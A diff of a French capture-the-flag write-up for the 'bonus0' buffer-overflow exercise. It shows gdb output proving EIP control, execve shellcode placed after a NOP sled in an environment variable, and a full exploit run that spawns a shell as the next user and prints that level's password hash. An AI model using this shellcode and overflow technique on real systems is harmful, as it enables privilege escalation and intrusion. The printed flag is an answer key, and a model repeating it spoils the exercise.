@@ -70,63 +70,55 @@ abcdefghijabcdefghij01234567890123456789 01234567890123456789
 [1]    3889 segmentation fault  ./bonus0
 ```
 
-Avec gdb, c'est plus clair, et on voit que `EIP` est réécrit au 13<sup>ème</sup> caractère du second `read`.
+Avec gdb, c'est plus clair, et on voit que `EIP` est réécrit au 9<sup>ème</sup> caractère du second `read`.
 
-Notre shell code de 28 bytes:
-`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`
+On voit qu'on peut aussi lancer en une commande :
+```gdb
+(gdb) r < <(python -c 'print "A"*4095 + "\n" + "B"*9 + "0123" + "C" * 200')
+Starting program: /home/user/bonus0/bonus0 < <(python -c 'print "A"*4095 + "\n" + "B"*9 + "0123" + "C" * 200')
+ -
+ -
+AAAAAAAAAAAAAAAAAAAABBBBBBBBB0123CCCCCCC��� BBBBBBBBB0123CCCCCCC���
 
-Les 20 premiers caractères:
-`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0`
-les 8 suivants:
-`\x0b\xcd\x80\x31\xc0\x40\xcd\x80`
-
-l'adresse de buf: `0xbffff236`
+Program received signal SIGSEGV, Segmentation fault.
+0x33323130 in ?? ()
 ```
-./bonus0 < <(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0"."\n"."A"x(4096-21)."\x0b\xcd\x80\x31\xc0\x40\xcd\x80"."\x90"x(13-8)."\x36\xf2\xff\xbf"."A"x(7-4)."\n"')
-```
-
-On va se créer un programme pour retrouver l'adresse de l'env.
-
-getenv.c:
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
-int main(int ac, char **av) {
-        char *ptr;
-
-        ptr = getenv(av[1]);
-        ptr += strlen(av[0]) - strlen(av[2]);
-
-        printf("%s -- %p\n", av[1], ptr);
-        return 0;
-}
-```
-Et on copile avec `gcc getenv.c -o getenv`
+On retrouve bien notre `0x33323130`, à savoir "0123"
 
 
 On va mettre notre shell code dans une variable d'environnement en laissant un peu de place avant :
+`export EXPLOIT=$(python -c 'print "\x90" * 4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')`
 
-`export SHELLCODE="$(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')"`
+Avec gdb, on va chercher l'adresse de la variable d'environnement avec `p/s *environ`. Si on ne la trouve pas direct, on peut afficher les suivants `p/3s *environ`
+
+On va décaller cette adresse de 512 pour être sûr de tomber dessus. `p/x 0xbfffe8e0 + 512`
+On décalle cette adresse car selon les argument, l'adresse de `EXPLOIT` peut changer. Ici on est sûr.
 
 
-`export SHELLCODE="$(perl -e 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')`
-
-En lançant `./getenv SHELLCODE ./bonus0`, on trouve `SHELLCODE -- 0xbffff90a`
-
-```
-perl -e 'print "A"x(4095)."\n"."B"x(9)."\x23\xf9\xff\xbf"."\n"' > /tmp/a;  cat /tmp/a - | ./bonus0
-```
-
-```
-perl -e 'print "A"x4095 . "\n" . "B"x9 . "\x11\xf9\xff\xbf" . "B"x7 . "\n"' > /tmp/a ; cat /tmp/a - | ./bonus0
-```
-
-`cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
 
 ## Exploit :
 
 ```sh
+sh $ export EXPLOIT=$(python -c 'print "\x90" * 4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
+sh $ gdb ./bonus0
+(gdb) b main
+(gdb) r
+(gdb) p/s *environ
+0xbfffe8e0:      "EXPLOIT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+(gdb) p/x 0xbfffe8e0 + 512
+$1 = 0xbfffeae0
+(gdb) q
+sh $ python -c 'print "A" * 4095 + "\n" + "\x90"*9 + "\xe0\xea\xff\xbf" + "AAAA" * 50' > /tmp/a; cat /tmp/a - | ./bonus0
+ -
+ -
+AAAAAAAAAAAAAAAAAAAA�������������AAAAAAA��� �������������AAAAAAA���
 
+whoami
+bonus1
+cd ../bonus1
+cat .pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 ```
+
+## Documentation :
+* https://stackoverflow.com/questions/14760587/how-does-a-nop-sled-work#:~:text=The
